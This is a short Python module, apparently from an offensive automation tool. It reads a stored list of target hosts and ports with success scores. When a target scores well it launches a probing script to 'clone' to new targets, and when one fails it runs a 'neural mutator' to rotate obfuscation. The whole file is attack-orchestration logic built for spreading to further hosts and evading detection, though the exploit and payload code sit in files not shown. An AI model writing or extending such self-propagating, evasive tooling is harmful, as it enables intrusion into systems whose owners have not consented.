from memory_engine import get_top_targets, load_memory, save_memory
import subprocess, random

def react():
    mem = load_memory()
    top = get_top_targets()
    for t in top:
        ip, port = t.split(":")
        port = int(port)
        score = mem[t]["score"]
        # On high success, replay to new hosts
        if score >= 2 and random.random() < 0.5:
            print(f"[REACT] Cloning to new target from {t}")
            subprocess.call(["python", "../core/adaptive_probe.py"])
        # On failure, rotate obfuscation
        elif score < 0:
            print(f"[REACT] Failure detected on {t}, mutating strategy")
            subprocess.call(["python", "../core/neural_mutator.py"])
